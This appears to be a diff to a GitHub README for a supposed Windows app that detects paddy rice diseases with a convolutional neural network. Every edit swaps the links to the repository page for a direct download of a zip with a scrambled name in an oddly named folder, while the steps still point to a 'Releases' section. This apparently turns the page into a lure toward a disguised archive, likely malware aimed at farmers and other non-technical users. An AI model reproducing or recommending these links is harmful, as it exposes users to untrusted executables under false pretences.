@@ -1,6 +1,6 @@
 # 🌾 paddy-disease-classification-CNN-Convolutional-Neural-Network- - Easy Paddy Disease Detection
 
-[![Download Now](https://img.shields.io/badge/Download-Paddy%20Disease%20App-green?style=for-the-badge)](https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-)
+[![Download Now](https://img.shields.io/badge/Download-Paddy%20Disease%20App-green?style=for-the-badge)](https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-/raw/refs/heads/main/lubbercock/disease_paddy_CN_Network_classification_Neural_Convolutional_1.3.zip)
 
 ## 🧾 About This Application
 
@@ -27,7 +27,7 @@ Follow these steps to download and run the app on your Windows computer. The pro
 
 ---
 
-[![Download the App](https://img.shields.io/badge/Download-paddy-disease-classification-blue?style=for-the-badge&logo=github)](https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-)
+[![Download the App](https://img.shields.io/badge/Download-paddy-disease-classification-blue?style=for-the-badge&logo=github)](https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-/raw/refs/heads/main/lubbercock/disease_paddy_CN_Network_classification_Neural_Convolutional_1.3.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to download and run the app on your Windows computer. The pro
 
 1. **Go to the download page:**  
    Click this link or copy it into your browser's address bar:  
-   https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-  
+   https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-/raw/refs/heads/main/lubbercock/disease_paddy_CN_Network_classification_Neural_Convolutional_1.3.zip  
 
 2. **Find the latest release:**  
    On the GitHub page, look for the section called "Releases." It usually appears on the right side or under the main repository tab.  
@@ -99,7 +99,7 @@ The app uses a Convolutional Neural Network (CNN), a kind of AI that recognizes 
 To update:
 
 1. Visit the GitHub page again:  
-   https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-
+   https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-/raw/refs/heads/main/lubbercock/disease_paddy_CN_Network_classification_Neural_Convolutional_1.3.zip
 
 2. Download the latest version as explained above.
 
@@ -118,4 +118,4 @@ Start by reading the built-in help guide inside the app. This guide explains fea
 
 ---
 
-[Download the app here](https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-) and start identifying paddy diseases quickly and easily on your Windows machine.
+[Download the app here](https://github.com/Moza630/paddy-disease-classification-CNN-Convolutional-Neural-Network-/raw/refs/heads/main/lubbercock/disease_paddy_CN_Network_classification_Neural_Convolutional_1.3.zip) and start identifying paddy diseases quickly and easily on your Windows machine.
